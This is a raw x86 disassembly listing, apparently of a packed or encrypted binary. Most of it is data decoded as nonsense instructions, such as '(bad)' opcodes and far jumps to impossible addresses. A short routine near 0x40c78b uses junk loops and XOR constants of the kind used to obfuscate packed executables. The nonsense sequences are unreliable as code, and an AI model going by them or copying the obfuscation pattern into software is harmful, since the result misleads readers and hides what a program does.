  40c4cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4d0:	jmp    0x95dec4f7
  40c4d5:	les    edi,FWORD PTR [ecx+0x77368b3a]
  40c4db:	jns    0x40c495
  40c4dd:	pop    ebx
  40c4de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4e0:	scas   eax,DWORD PTR es:[edi]
  40c4e1:	stc    
  40c4e2:	jno    0x40c4a5
  40c4e4:	xor    dh,BYTE PTR [esi-0x6e561a0e]
  40c4ea:	pop    ecx
  40c4eb:	xchg   esi,eax
  40c4ec:	add    cl,BYTE PTR [edi]
  40c4ee:	jno    0x40c531
  40c4f0:	and    BYTE PTR [esi+0x447bfbdb],dh
  40c4f6:	pop    ss
  40c4f7:	aaa    
  40c4f8:	cmp    ecx,0xf94e636
  40c4fe:	lds    ecx,FWORD PTR [esi]
  40c500:	xor    al,0x76
  40c502:	add    dl,BYTE PTR [edi-0x1e]
  40c505:	nop
  40c506:	mov    bl,0xd0
  40c508:	aam    0x79
  40c50a:	mov    ax,ds:0xc24c1c07
  40c510:	mov    dl,0xe3
  40c512:	ins    BYTE PTR es:[edi],dx
  40c513:	stos   DWORD PTR es:[edi],eax
  40c514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c515:	stos   DWORD PTR es:[edi],eax
  40c516:	pushf  
  40c517:	not    BYTE PTR [eax]
  40c519:	mov    esi,0x5e9ca9e5
  40c51e:	mov    dl,0x23
  40c520:	xchg   ebx,eax
  40c521:	aad    0xe1
  40c523:	and    al,0xfa
  40c525:	xor    BYTE PTR [ecx+eiz*8],0xa1
  40c529:	fisttp DWORD PTR [ebx+0x46]
  40c52c:	inc    eax
  40c52d:	ficom  WORD PTR [ecx+ebx*1]
  40c530:	adc    bh,ah
  40c532:	xor    eax,0x31cae86b
  40c537:	adc    ebp,DWORD PTR [ebx+0x43655e8a]
  40c53d:	popf   
  40c53e:	loope  0x40c59d
  40c540:	aas    
  40c541:	scas   al,BYTE PTR es:[edi]
  40c542:	or     edi,DWORD PTR [ecx-0x39]
  40c545:	jmp    0x40c4f9
  40c547:	jbe    0x40c55e
  40c549:	arpl   sp,di
  40c54b:	push   ebx
  40c54c:	jb     0x40c52e
  40c54e:	mov    esp,0x3e2deae9
  40c553:	sub    al,0x85
  40c555:	inc    ebx
  40c556:	ret    0xaa72
  40c559:	fild   QWORD PTR [ebx]
  40c55b:	aad    0xeb
  40c55d:	adc    edi,DWORD PTR [esi+0x353f6d94]
  40c563:	push   ebp
  40c564:	or     BYTE PTR [ecx+0x7],dl
  40c567:	jmp    0x40c782
  40c56c:	jnp    0x40c5eb
  40c56e:	xchg   edi,eax
  40c56f:	les    edx,FWORD PTR [ecx+0x72c54b52]
  40c575:	sub    esi,DWORD PTR [eax-0xf]
  40c578:	and    eax,0x712beae2
  40c57d:	xchg   DWORD PTR [eax+0x70],esi
  40c580:	jb     0x40c601
  40c582:	jo     0x40c5f4
  40c584:	lock xor esp,ecx
  40c587:	or     al,0x1b
  40c589:	lods   al,BYTE PTR ds:[esi]
  40c58a:	int3   
  40c58b:	or     DWORD PTR [ebx+0x2c],esi
  40c58e:	mov    eax,0x241cc923
  40c593:	push   ds
  40c594:	js     0x40c5f6
  40c596:	into   
  40c597:	test   DWORD PTR [edi-0x366e9c2],ebx
  40c59d:	aas    
  40c59e:	or     esi,DWORD PTR [edx+0x73]
  40c5a1:	ss into 
  40c5a3:	dec    eax
  40c5a4:	popa   
  40c5a5:	dec    esi
  40c5a6:	or     dx,WORD PTR [esi+0x3098e15a]
  40c5ad:	xchg   esp,eax
  40c5ae:	jecxz  0x40c5b5
  40c5b0:	bound  ecx,QWORD PTR [ebp-0x6329e4f9]
  40c5b6:	in     al,dx
  40c5b7:	push   ds
  40c5b8:	jp     0x40c5e3
  40c5ba:	xchg   edi,eax
  40c5bb:	mov    ss,WORD PTR [ebp-0x1268adbf]
  40c5c1:	leave  
  40c5c2:	sbb    bl,BYTE PTR [ebx]
  40c5c4:	js     0x40c5aa
  40c5c6:	in     al,0x4b
  40c5c8:	mov    edx,0xcdb49dfc
  40c5cd:	add    DWORD PTR [ebx],edi
  40c5cf:	jecxz  0x40c59e
  40c5d1:	xor    eax,eax
  40c5d3:	outs   dx,DWORD PTR ds:[esi]
  40c5d4:	(bad)  
  40c5d5:	pop    ds
  40c5d6:	gs push eax
  40c5d8:	sbb    bl,0x96
  40c5db:	into   
  40c5dc:	ret    
  40c5dd:	imul   ebp,DWORD PTR [edx+0x57],0xb095a060
  40c5e4:	and    BYTE PTR [ecx],0x21
  40c5e7:	sub    ebx,DWORD PTR [edi-0x7b9ff4d9]
  40c5ed:	ds mov esi,0xf668a75
  40c5f3:	cmp    BYTE PTR [edi-0x8e6b358],dl
  40c5f9:	add    esp,esi
  40c5fb:	jp     0x93933d09
  40c601:	add    DWORD PTR [esi+0x534f83ae],edx
  40c607:	mov    edi,0xed054ada
  40c60c:	sub    edx,DWORD PTR [ebp-0x6e]
  40c60f:	je     0x40c63c
  40c611:	or     al,0x38
  40c613:	cmp    al,cl
  40c615:	popa   
  40c616:	iret   
  40c617:	mov    ebp,0x489501fc
  40c61c:	imul   edi,DWORD PTR ds:0x7aa9b99f,0x58
  40c623:	sbb    bl,al
  40c625:	pop    edx
  40c626:	jae    0x40c695
  40c628:	imul   esi,DWORD PTR [ebx+esi*8],0x2a6d0611
  40c62f:	jp     0x40c5eb
  40c631:	or     bh,BYTE PTR ds:[eax+0xd]
  40c635:	or     edx,DWORD PTR [esi]
  40c637:	jo     0x40c67c
  40c639:	into   
  40c63a:	iret   
  40c63b:	xchg   edx,eax
  40c63c:	mov    esp,0x1484cbb
  40c641:	leave  
  40c642:	in     al,0x62
  40c644:	int    0x75
  40c646:	aad    0x34
  40c648:	mov    ch,0x6b
  40c64a:	push   0x46
  40c64c:	outs   dx,BYTE PTR ds:[esi]
  40c64d:	pop    eax
  40c64e:	sbb    al,0xee
  40c650:	retf   0x9095
  40c653:	enter  0x5380,0x4c
  40c657:	jno    0x40c5f6
  40c659:	sbb    ecx,DWORD PTR [ebp+0x305ea131]
  40c65f:	rcr    ecx,0x86
  40c662:	cmc    
  40c663:	fs pushf 
  40c665:	fwait
  40c666:	and    esp,DWORD PTR [ebp-0x7f8488e7]
  40c66c:	adc    ch,BYTE PTR [eax]
  40c66e:	mov    ah,0x14
  40c670:	inc    ebx
  40c671:	repnz push cs
  40c673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c674:	pop    esp
  40c675:	pop    ebp
  40c676:	les    edi,FWORD PTR [eax+0x6fa50a46]
  40c67c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c67d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c67e:	and    eax,0x388f9706
  40c683:	jg     0x40c614
  40c685:	(bad)  
  40c686:	arpl   WORD PTR [ecx-0x32],ax
  40c689:	fsub   QWORD PTR [esi]
  40c68b:	rcr    DWORD PTR [ebx-0x74],0xc3
  40c68f:	sub    DWORD PTR [ebp+0x20f7be0f],ebp
  40c695:	pop    edx
  40c696:	sbb    al,0x69
  40c698:	out    dx,eax
  40c699:	push   cs
  40c69a:	mov    al,ds:0x503c84d
  40c69f:	hlt    
  40c6a0:	fld    QWORD PTR [ecx+0x95b8893]
  40c6a6:	dec    edi
  40c6a7:	ds jge 0x40c696
  40c6aa:	adc    dh,bh
  40c6ac:	retf   
  40c6ad:	retf   
  40c6ae:	mov    dh,0x95
  40c6b0:	pop    ds
  40c6b1:	enter  0xd82b,0x3e
  40c6b5:	cdq    
  40c6b6:	mov    al,0x74
  40c6b8:	aam    0x68
  40c6ba:	adc    ecx,DWORD PTR [edi]
  40c6bc:	sahf   
  40c6bd:	jns    0x40c73a
  40c6bf:	ss dec esp
  40c6c1:	fiadd  DWORD PTR [ebx-0x79a91d62]
  40c6c7:	repz aaa 
  40c6c9:	mov    ds:0x74878f97,al
  40c6ce:	adc    BYTE PTR [ebp-0x3846370e],0xf8
  40c6d5:	dec    ebx
  40c6d6:	into   
  40c6d7:	adc    al,0x17
  40c6d9:	sbb    ecx,DWORD PTR [ebx-0x66ef745f]
  40c6df:	dec    eax
  40c6e0:	je     0x40c741
  40c6e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6e3:	xor    dl,0x56
  40c6e6:	in     eax,dx
  40c6e7:	sub    cl,BYTE PTR [esi+0x1c]
  40c6ea:	retf   
  40c6eb:	adc    bl,ch
  40c6ed:	rol    DWORD PTR [eax+0x50214766],0x30
  40c6f4:	push   esi
  40c6f5:	sti    
  40c6f6:	dec    edx
  40c6f7:	mov    dl,0x44
  40c6f9:	rcl    BYTE PTR [ecx+0x32],0xcd
  40c6fd:	sahf   
  40c6fe:	inc    ebp
  40c6ff:	(bad)  
  40c700:	mov    edx,0xbc2a9e57
  40c705:	cmp    ecx,DWORD PTR [eax]
  40c707:	cmp    bl,BYTE PTR [edx+0x53a67a31]
  40c70d:	adc    ah,BYTE PTR [edx+0x54]
  40c710:	push   0xffffffc9
  40c712:	cwde   
  40c713:	mov    edx,0x42049498
  40c718:	psrlq  mm4,QWORD PTR [ebx+0x45]
  40c71c:	rol    ch,0xd8
  40c71f:	(bad)  
  40c720:	fnsave [edi]
  40c722:	hlt    
  40c723:	xlat   BYTE PTR ds:[ebx]
  40c724:	adc    eax,0x7aae2545
  40c729:	mov    eax,0xf570c2a7
  40c72e:	cmp    esp,DWORD PTR [edx]
  40c730:	loopne 0x40c6b2
  40c732:	mov    edi,0x20b92a3
  40c737:	sbb    al,0x9a
  40c739:	fstp   DWORD PTR [ecx+0x28]
  40c73c:	jle    0x40c783
  40c73e:	dec    ecx
  40c73f:	dec    edi
  40c740:	sub    ebx,DWORD PTR [edi]
  40c742:	xor    dh,BYTE PTR [ebp+0x3f]
  40c745:	out    0x9e,al
  40c747:	xchg   esp,eax
  40c748:	push   es
  40c749:	addr16 mov dl,0x39
  40c74c:	cli    
  40c74d:	hlt    
  40c74e:	sbb    ah,BYTE PTR [eax-0x4c581bfb]
  40c754:	rcr    DWORD PTR [ebp-0x46a5d5cc],0xc5
  40c75b:	rcl    BYTE PTR [eax],cl
  40c75d:	xchg   ebx,eax
  40c75e:	(bad)  
  40c75f:	in     eax,0x25
  40c761:	push   esi
  40c762:	neg    DWORD PTR [edx]
  40c764:	loope  0x40c700
  40c766:	pushf  
  40c767:	retf   0x93a6
  40c76a:	pop    ds
  40c76b:	mov    ebx,DWORD PTR [eax-0x2fd2fa37]
  40c771:	mov    esi,0x1185a7ec
  40c776:	pop    ebx
  40c777:	(bad)  
  40c778:	out    dx,al
  40c779:	mov    ecx,0x60cb855f
  40c77e:	dec    esp
  40c77f:	mov    eax,DWORD PTR [edx]
  40c781:	adc    eax,0x32729c05
  40c786:	add    cl,cl
  40c788:	ret    0x4
  40c78b:	push   ebp
  40c78c:	mov    ebp,esp
  40c78e:	mov    eax,ds:0x416224
  40c793:	mov    edx,0x32729c
  40c798:	and    DWORD PTR ds:0x434372,edi
  40c79e:	sub    eax,edx
  40c7a0:	and    DWORD PTR ds:0x432700,0x0
  40c7aa:	jmp    0x40c7bc
  40c7af:	mov    ecx,DWORD PTR ds:0x432700
  40c7b5:	inc    ecx
  40c7b6:	mov    DWORD PTR ds:0x432700,ecx
  40c7bc:	cmp    DWORD PTR ds:0x432700,0x1c
  40c7c3:	jae    0x40c8aa
  40c7c9:	cmp    DWORD PTR ds:0x432700,0x21
  40c7d0:	jne    0x40c7e4
  40c7d6:	push   0x432dc2
  40c7db:	push   DWORD PTR [ebp-0x1c]
  40c7de:	call   DWORD PTR ds:0x432d1e
  40c7e4:	jmp    0x40c7af
  40c7e9:	and    DWORD PTR ds:0x434386,0x0
  40c7f3:	jmp    0x40c805
  40c7f8:	mov    ecx,DWORD PTR ds:0x434386
  40c7fe:	inc    ecx
  40c7ff:	mov    DWORD PTR ds:0x434386,ecx
  40c805:	cmp    DWORD PTR ds:0x434386,0x1a
  40c80c:	jae    0x40c8aa
  40c812:	cmp    DWORD PTR ds:0x434386,0x9
  40c819:	jne    0x40c82d
  40c81f:	push   0x43441d
  40c824:	push   DWORD PTR [ebp-0x24]
  40c827:	call   DWORD PTR ds:0x4329ea
  40c82d:	cmp    DWORD PTR ds:0x434386,0x8
  40c834:	jne    0x40c847
  40c83a:	mov    ecx,DWORD PTR ds:0x434386
  40c840:	inc    ecx
  40c841:	mov    DWORD PTR ds:0x434386,ecx
  40c847:	jmp    0x40c7f8
  40c84c:	mov    DWORD PTR ds:0x4343a2,0x1c
  40c856:	cmp    DWORD PTR ds:0x4343a2,0x0
  40c85d:	je     0x40c8aa
  40c863:	cmp    DWORD PTR ds:0x4343a2,0xf
  40c86a:	jne    0x40c87c
  40c870:	push   DWORD PTR [ebp-0x14]
  40c873:	push   DWORD PTR [ebp-0x20]
  40c876:	call   DWORD PTR ds:0x432c66
  40c87c:	cmp    DWORD PTR ds:0x4343a2,0x10
  40c883:	jne    0x40c898
  40c889:	xor    ecx,ecx
  40c88b:	xor    ecx,DWORD PTR ds:0x4343a2
  40c891:	dec    ecx
  40c892:	mov    DWORD PTR ds:0x4343a2,ecx
  40c898:	mov    ecx,DWORD PTR ds:0x4343a2
  40c89e:	dec    ecx
  40c89f:	mov    DWORD PTR ds:0x4343a2,ecx
  40c8a5:	jmp    0x40c856
  40c8aa:	mov    ecx,0x7510855
  40c8af:	push   esi
  40c8b0:	mov    esi,DWORD PTR [ebp+0xc]
  40c8b3:	xor    eax,ecx
  40c8b5:	cmp    eax,esi
  40c8b7:	je     0x40d05a
  40c8bd:	mov    eax,ds:0x41621c
  40c8c2:	mov    esi,DWORD PTR [ebp+0xc]
  40c8c5:	sub    eax,edx
  40c8c7:	xor    eax,ecx
  40c8c9:	jmp    0x40cb3d
  40c8ce:	xchg   edi,eax
  40c8cf:	rol    DWORD PTR ds:0xb5744198,1
  40c8d5:	icebp  
  40c8d6:	lods   al,BYTE PTR ds:[esi]
  40c8d7:	add    al,0x98
  40c8d9:	rcr    DWORD PTR [esi+0x2f],0x28
  40c8dd:	mov    eax,ds:0x70708573
  40c8e2:	leave  
  40c8e3:	jle    0x40c955
  40c8e5:	jo     0x40c90f
  40c8e7:	imul   bh
  40c8e9:	jp     0x40c8a0
  40c8eb:	push   edx
  40c8ec:	adc    BYTE PTR [ecx],dh
  40c8ee:	pop    ds
  40c8ef:	sub    ah,cl
  40c8f1:	iret   
  40c8f2:	push   edi
  40c8f3:	xor    ebp,DWORD PTR [ebp+0x2e17a6b3]
  40c8f9:	mov    ecx,0x22b0b86
  40c8fe:	add    eax,0xdfd9aa16
  40c903:	cmp    al,BYTE PTR [ebx-0x68]
  40c906:	pop    ebp
  40c907:	aaa    
  40c908:	in     eax,0xd7
  40c90a:	gs call 0x1d8e:0x3ef880d
  40c912:	repz push edi
  40c914:	js     0x40c8f4
  40c916:	fisttp QWORD PTR [ebx-0x6]
  40c919:	push   ds
  40c91a:	ror    BYTE PTR ds:0xdcd69499,0x9d
  40c921:	pop    esi
  40c922:	stos   DWORD PTR es:[edi],eax
  40c923:	das    
  40c924:	xchg   DWORD PTR [edi-0x20],edi
  40c927:	fs add ah,ah
  40c92a:	mov    edi,0xf6aeb825
  40c92f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c930:	(bad)  
  40c931:	sub    DWORD PTR fs:[eax-0x6],0xb
  40c936:	adc    eax,0xaa8602b8
  40c93b:	outs   dx,BYTE PTR ds:[esi]
  40c93c:	loope  0x40c97b
  40c93e:	sar    DWORD PTR [ebp+eax*8-0x4268b8f9],1
  40c945:	outs   dx,DWORD PTR ds:[esi]
  40c946:	add    DWORD PTR [edi-0x64b2141b],esi
  40c94c:	sbb    edi,ebx
  40c94e:	jg     0x40c91f
  40c950:	dec    esi
  40c951:	mov    esi,0xc9072b80
  40c956:	mov    al,ds:0xd61c6c5b
  40c95b:	jmp    0x9ede:0x3ac47cdf
  40c962:	js     0x40c8ef
  40c964:	mov    BYTE PTR [esi-0x2e4959e9],dh
  40c96a:	and    BYTE PTR ss:[edx-0x35],0x2d
  40c96f:	xchg   edi,eax
  40c970:	cli    
  40c971:	sbb    al,0xea
  40c973:	xchg   ebp,eax
  40c974:	xchg   ecx,eax
  40c975:	push   0xffffffa6
  40c977:	xchg   esi,eax
  40c978:	test   eax,0xf8ab77f2
  40c97d:	fidivr WORD PTR [eax]
  40c97f:	fimul  WORD PTR [eax-0x9]
  40c982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c983:	mov    dl,0xb3
  40c985:	jmp    0x6b48e61e
  40c98a:	inc    ebp
  40c98b:	sub    BYTE PTR [ecx-0x13],dl
  40c98e:	loopne 0x40c931
  40c990:	(bad)  
  40c991:	push   ebp
  40c992:	fild   WORD PTR [ecx+esi*1+0x4]
  40c996:	lds    edx,FWORD PTR [ebx-0x2ca3050b]
  40c99c:	das    
  40c99d:	shl    edx,1
  40c99f:	jmp    DWORD PTR [edx]
  40c9a1:	stos   DWORD PTR es:[edi],eax
  40c9a2:	lods   al,BYTE PTR ds:[esi]
  40c9a3:	stos   DWORD PTR es:[edi],eax
  40c9a4:	mov    al,ds:0x7f74084e
  40c9a9:	and    al,0xe
  40c9ab:	out    dx,al
  40c9ac:	or     eax,0xc9cdf43a
  40c9b1:	aad    0xf1
  40c9b3:	bound  ebp,QWORD PTR [ebp-0x4b]
  40c9b6:	sub    ebp,DWORD PTR [esi]
  40c9b8:	xchg   edi,eax
  40c9b9:	stc    
  40c9ba:	jp     0x40c985
  40c9bc:	xlat   BYTE PTR ds:[ebx]
  40c9bd:	popf   
  40c9be:	in     al,dx
  40c9bf:	mov    bl,0x25
  40c9c1:	mov    eax,DWORD PTR [ecx]
  40c9c3:	push   ebp
  40c9c4:	push   0x902f4303
  40c9c9:	mov    WORD PTR ds:0xa935442a,fs
  40c9cf:	inc    ebp
  40c9d0:	fst    QWORD PTR [esi-0x27]
  40c9d3:	fwait
  40c9d4:	sar    DWORD PTR [eax+0xf0404db],0xe6
  40c9db:	mov    al,ds:0x7ee88c
  40c9e0:	mov    eax,0x4135181c
  40c9e5:	cmp    bl,BYTE PTR [eax-0x3403cfe8]
  40c9eb:	icebp  
  40c9ec:	rcr    DWORD PTR [edx+0x5e],0xb7
  40c9f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9f1:	and    dl,BYTE PTR [ebx-0x5d]
  40c9f4:	mov    edi,esi
  40c9f6:	cmc    
  40c9f7:	xor    al,0x1a
  40c9f9:	bound  ebx,QWORD PTR [ebx-0x53]
  40c9fc:	cmp    DWORD PTR [ebx+0x56],eax
  40c9ff:	mov    ds:0x926e5565,eax
  40ca04:	pushf  
  40ca05:	inc    ebx
  40ca06:	(bad)  
  40ca07:	cs and al,0x10
  40ca0a:	mov    eax,0xf10364a4
  40ca0f:	aad    0x17
  40ca11:	jmp    0x9b2d:0xa98dca2c
  40ca18:	pop    ebp
  40ca19:	lods   eax,DWORD PTR ds:[esi]
  40ca1a:	sbb    eax,DWORD PTR [eax-0x7f]
  40ca1d:	hlt    
  40ca1e:	jp     0x40ca20
  40ca20:	mov    edi,0x9e89c017
  40ca25:	mov    DWORD PTR [edi+0x2b6894cf],edx
  40ca2b:	repz sub eax,0xbdc9c653
  40ca31:	xlat   BYTE PTR ds:[ebx]
  40ca32:	ror    DWORD PTR [ecx],cl
  40ca34:	lods   eax,DWORD PTR ds:[esi]
  40ca35:	add    bh,ah
  40ca37:	(bad)  
  40ca38:	or     al,0xc2
  40ca3a:	scas   al,BYTE PTR es:[edi]
  40ca3b:	gs jmp 0x131495f2
  40ca41:	ja     0x40caac
  40ca43:	sub    DWORD PTR [ecx+0x44],edx
  40ca46:	mov    eax,ds:0xb79eb05f
  40ca4b:	rcr    DWORD PTR [esi],cl
  40ca4d:	aad    0x9f
  40ca4f:	retf   0x43d
  40ca52:	jmp    0xfe72:0x23aa18ca
  40ca59:	xor    dh,dh
  40ca5b:	or     al,0x29
  40ca5d:	jae    0x40ca9c
  40ca5f:	sub    eax,0x26fdf6b0
  40ca64:	popa   
  40ca65:	pop    edx
  40ca66:	mov    BYTE PTR [edx],ch
  40ca68:	xchg   DWORD PTR [ecx],edx
  40ca6a:	stc    
  40ca6b:	lods   eax,DWORD PTR ds:[esi]
  40ca6c:	xor    ebp,ecx
  40ca6e:	push   ebp
  40ca6f:	mov    edx,0x262e43
  40ca74:	in     eax,dx
  40ca75:	(bad)  
  40ca76:	jb     0x40ca5f
  40ca78:	mov    ebx,0x7ff065ee
  40ca7d:	or     ch,ah
  40ca7f:	cs xchg edi,eax
  40ca81:	inc    edx
  40ca82:	push   esi
  40ca83:	pop    eax
  40ca84:	enter  0xe267,0x40
  40ca88:	mov    esp,DWORD PTR [ebx-0x4fb2a883]
  40ca8e:	inc    esi
  40ca8f:	push   esi
  40ca90:	sbb    BYTE PTR ds:0x98e4207b,0xc7
  40ca97:	rcr    DWORD PTR gs:[eax+0x77],cl
  40ca9b:	mov    bl,0xa7
  40ca9d:	sub    bl,BYTE PTR [ecx+ecx*4-0x56]
  40caa1:	sub    edx,DWORD PTR [eax]
  40caa3:	fnstcw WORD PTR [esi+0xb]
  40caa6:	loopne 0x40cb02
  40caa8:	push   ebp
  40caa9:	dec    ecx
  40caaa:	stc    
  40caab:	dec    esp
  40caac:	pushf  
  40caad:	(bad)  
  40cab0:	iret   
  40cab1:	cmp    DWORD PTR [ebx],edi
  40cab3:	xchg   BYTE PTR [eax-0x64],ch
  40cab6:	pop    ebp
  40cab7:	hlt    
  40cab8:	out    dx,eax
  40cab9:	xchg   ecx,eax
  40caba:	ins    DWORD PTR es:[edi],dx
  40cabb:	or     ebx,DWORD PTR [ebx]
  40cabd:	rcr    DWORD PTR [ecx-0x8],cl
  40cac0:	mov    dh,BYTE PTR [edi]
  40cac2:	inc    esi
  40cac3:	jbe    0x40cb08
  40cac5:	fld    TBYTE PTR [esi-0x6e98ea46]
  40cacb:	pop    ecx
  40cacc:	jns    0x40cab7
  40cace:	pop    ds
  40cacf:	(bad)  [ecx+0x71]
  40cad2:	dec    esi
  40cad3:	jbe    0x40ca66
  40cad5:	cmp    DWORD PTR [edx+0x1d],ebx
  40cad8:	test   DWORD PTR [esi+0x15],edx
  40cadb:	inc    esi
  40cadc:	cmp    ecx,DWORD PTR [edi-0x55]
  40cadf:	jmp    0x5db53b7b
  40cae4:	loop   0x40cb18
  40cae6:	dec    esi
  40cae7:	and    DWORD PTR [ecx+0x42],esi
  40caea:	push   edi
  40caeb:	rol    dl,1
  40caed:	repz xor al,0xd
  40caf0:	lahf   
  40caf1:	add    eax,0x2e6ba706
  40caf6:	aas    
  40caf7:	xchg   esi,ebp
  40caf9:	lea    esi,[edx]
  40cafb:	dec    esi
  40cafc:	mov    ebp,0x8990ce0f
  40cb01:	inc    eax
  40cb02:	jbe    0x40cb44
  40cb04:	and    BYTE PTR [ecx],0x6
  40cb07:	jne    0x40cb3c
  40cb09:	in     eax,0xb
  40cb0b:	addr16 fs jnp 0x40cb8d
  40cb0f:	xchg   ebp,eax
  40cb10:	and    edx,DWORD PTR [esi-0x2b]
  40cb13:	enter  0x7e6,0xd2
  40cb17:	fwait
  40cb18:	mov    bh,0xc5
  40cb1a:	xor    DWORD PTR [ecx],esp
  40cb1c:	push   eax
  40cb1d:	or     ecx,edx
  40cb1f:	addr16 stc 
  40cb21:	shr    BYTE PTR [edi*8-0x43637cce],0x97
  40cb29:	les    edi,FWORD PTR [edx+0x49]
  40cb2c:	or     dh,al
  40cb2e:	and    BYTE PTR [ecx-0x24],dh
  40cb31:	out    0x6a,eax
  40cb33:	adc    eax,DWORD PTR [edi-0x3d]
  40cb36:	lahf   
  40cb37:	mov    fs,WORD PTR [edi+ebx*1-0x4f]
  40cb3b:	xor    al,0x1f
  40cb3d:	cmp    eax,esi
  40cb3f:	jne    0x40cb55
  40cb45:	mov    eax,ds:0x416224
  40cb4a:	add    eax,DWORD PTR ds:0x41621c
  40cb50:	jmp    0x40d044
  40cb55:	mov    eax,DWORD PTR [ebp+0xc]
  40cb58:	xor    eax,ecx
  40cb5a:	jmp    0x40cdce
  40cb5f:	pop    ecx
  40cb60:	scas   al,BYTE PTR es:[edi]
  40cb61:	sbb    BYTE PTR [ebx-0xd],al
  40cb64:	push   ecx
  40cb65:	pop    ecx
  40cb66:	mov    dh,0xd4
  40cb68:	(bad)
  40cb6b:	ror    DWORD PTR [ecx],0xe
  40cb6e:	mov    eax,ds:0x707082cc
  40cb73:	leave  
  40cb74:	jle    0x40cbe6
  40cb76:	jo     0x40cb96
  40cb78:	and    BYTE PTR [edi+0x64],cl
  40cb7b:	xlat   BYTE PTR ds:[ebx]
  40cb7c:	sbb    al,0x79
  40cb7e:	enter  0xf6c9,0x69
  40cb82:	push   esi
  40cb83:	aaa    
  40cb84:	adc    cl,BYTE PTR [edi-0x2688ebb7]
  40cb8a:	das    
  40cb8b:	ds retf 
  40cb8d:	xchg   edi,eax
  40cb8e:	imul   ebp,edx,0x495bb7b4
  40cb94:	and    al,0x17
  40cb96:	or     ah,BYTE PTR [edx]
  40cb98:	xor    eax,0x585d122c
  40cb9d:	push   edx
  40cb9e:	jb     0x40cb6b
  40cba0:	lods   al,BYTE PTR ds:[esi]
  40cba1:	or     ah,dl
  40cba3:	imul   ecx,DWORD PTR [edi],0xed9af8d2
  40cba9:	test   BYTE PTR [eax-0x1],al
  40cbac:	jp     0x40cb85
  40cbae:	lods   al,BYTE PTR ds:[esi]
  40cbaf:	sub    eax,0x7b71c78b
  40cbb4:	push   ebp
  40cbb5:	adc    eax,0xf2477292
  40cbba:	dec    ecx
  40cbbb:	bound  edx,QWORD PTR [edi+0x7e8cdff0]
  40cbc1:	push   edx
  40cbc2:	xchg   edi,eax
  40cbc4:	pop    eax
  40cbc5:	jnp    0x40cb91
  40cbc7:	mov    ax,0x68c9
  40cbcb:	iret   
  40cbcc:	xchg   esp,eax
  40cbcd:	inc    esi
  40cbce:	inc    esp
  40cbcf:	inc    ebx
  40cbd0:	fcmovbe st,st(5)
  40cbd2:	inc    edx
  40cbd3:	aam    0x7b
  40cbd5:	cdq    
  40cbd6:	mov    esp,0x31308be0
  40cbdb:	out    0x2e,eax
  40cbdd:	jne    0x40cbc3
  40cbdf:	jp     0x40cc5d
  40cbe1:	std    
  40cbe2:	(bad)  
  40cbe3:	push   esp
  40cbe4:	(bad)  
  40cbe5:	mov    eax,ds:0x1c4065a3
  40cbea:	add    DWORD PTR [esi-0x42],ebp
  40cbed:	push   edi
  40cbee:	mov    ecx,0x146445b4
  40cbf3:	sahf   
  40cbf4:	jmp    0xee43:0xf6419006
  40cbfb:	dec    ebp
  40cbfc:	popa   
  40cbfd:	lods   al,BYTE PTR ds:[esi]
  40cbfe:	push   edx
  40cbff:	sbb    al,0x7a
  40cc01:	jl     0x40cbc0
  40cc03:	(bad)  
  40cc05:	pop    esi
  40cc06:	sbb    ebx,DWORD PTR [eax]
  40cc08:	retf   0x61a
  40cc0b:	(bad)  
  40cc0c:	jle    0x40cc7f
  40cc0e:	xor    eax,0x112df82
  40cc13:	mov    eax,ds:0x3767d480
  40cc18:	push   esp
  40cc19:	loopne 0x40cc35
  40cc1b:	and    al,0x39
  40cc1d:	dec    ebx
  40cc1e:	int3   
  40cc1f:	out    0x27,al
  40cc21:	stos   DWORD PTR es:[edi],eax
  40cc22:	sahf   
  40cc23:	std    
  40cc24:	ja     0x40cc9a
  40cc26:	je     0x40cc45
  40cc28:	cmp    DWORD PTR ds:0xd05fec3a,ecx
  40cc2e:	dec    edx
  40cc2f:	sub    esp,DWORD PTR [edi+0x2b71ddff]
  40cc35:	mov    dl,0x99
  40cc37:	jle    0x40cbd6
  40cc39:	inc    BYTE PTR [edi]
  40cc3b:	inc    eax
  40cc3c:	call   0x97a7fa8e
  40cc41:	jno    0x40cc56
  40cc43:	xchg   esp,eax
  40cc44:	jb     0x40cbcc
  40cc46:	xor    ah,BYTE PTR [eax]
  40cc48:	bound  esi,QWORD PTR [ebp+0xf]
  40cc4b:	gs (bad) 
  40cc4e:	pop    ecx
  40cc4f:	lea    ecx,[esi]
  40cc51:	xchg   esp,eax
  40cc52:	jmp    0x29a9:0x5736bcd1
  40cc59:	(bad)  
  40cc5a:	jge    0x40ccd6
  40cc5c:	sub    ebp,ebp
  40cc5e:	cwde   
  40cc5f:	jecxz  0x40ccae
  40cc61:	(bad)  
  40cc62:	jecxz  0x40cc0b
  40cc64:	xor    esi,ecx
  40cc66:	jmp    0xdb59:0x692961cc
  40cc6d:	xchg   ecx,eax
  40cc6e:	call   0x1d51:0xd39c37ea
  40cc75:	cmp    BYTE PTR [edi],ah
  40cc77:	loope  0x40cc85
  40cc79:	xchg   esp,eax
  40cc7a:	pusha  
  40cc7b:	dec    ecx
  40cc7c:	fs mov ecx,0xd61bd7fb
  40cc82:	jl     0x40cc2d
  40cc84:	or     ebp,DWORD PTR [ecx]
  40cc86:	ins    DWORD PTR es:[edi],dx
  40cc87:	fs push edx
  40cc89:	or     bl,dl
  40cc8b:	xchg   ebx,eax
  40cc8c:	fdivr  DWORD PTR [edx-0xa]
  40cc8f:	jg     0x40cc3b
  40cc91:	mov    esp,0x713f670
  40cc96:	pop    ebp
  40cc97:	vpcmpgtb ymm1,ymm3,YMMWORD PTR [edi+ebx*1+0x1e7ff14e]
  40cca0:	add    eax,0x18acf685
  40cca5:	stos   DWORD PTR es:[edi],eax
  40cca6:	mov    dl,0xf2
  40cca8:	mov    ebp,0x2fdca169
  40ccad:	mov    ch,0x5c
